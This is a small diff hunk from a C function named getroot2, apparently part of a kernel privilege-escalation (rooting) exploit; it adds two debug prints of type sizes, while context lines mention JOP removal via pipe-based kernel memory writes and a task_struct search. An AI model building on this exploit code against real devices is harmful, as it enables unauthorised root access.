@@ -363,6 +363,9 @@ int getroot2(struct offsets2* o)
 	//printf("[+] Removing get_threadinfo JOP\n");
 	//if(writel_at_address_pipe(o->check_flags, 0))
 	//	goto end;
+
+	printf("sizeof(unsigned long) = %d\n", sizeof(unsigned long));
+	printf("sizeof(int) = %d\n", sizeof(int));
 	if(0!=init_utils64()) {
 		printf("[+] task_struct search init error!\n");
 		goto end;
